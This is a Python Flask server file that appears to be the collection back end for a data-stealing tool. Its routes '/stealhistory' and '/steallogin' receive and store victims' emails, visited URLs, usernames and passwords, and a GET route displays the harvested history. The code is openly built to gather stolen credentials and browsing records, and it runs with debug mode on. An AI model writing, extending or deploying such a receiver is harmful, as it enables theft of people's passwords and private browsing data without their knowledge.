
from flask import Flask, render_template, request, session, redirect, url_for
import history, login, secure

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/stealhistory", methods=['POST', 'GET'])
def stealhistory():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        time = request.form['last_visited']
        history.addToHistory(email, url, time)
        return "\n\n\nWe added to history: " + email
    elif request.method == 'GET':
        data = history.getHistory()
        return render_template('history.html', data = data)

@app.route('/addSecure', methods=['POST'])
def add_secure():
    if request.method == 'POST':
        url = request.form['url']
        secure.addToSecure(url)
        urls = secure.getFromSecure()
        urls = map(lambda x: str(x[0]), urls)
        return render_template("index.html", urls=urls)

@app.route("/steallogin", methods=['POST'])
def steallogin():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.addToLogin(email, url, username, password)
        return "we all good here"

if __name__ == "__main__":
    app.config['TEMPLATES_AUTO_RELOAD'] = True # So template reloads when data is changed
    app.run(host='localhost', port=5000, debug=True)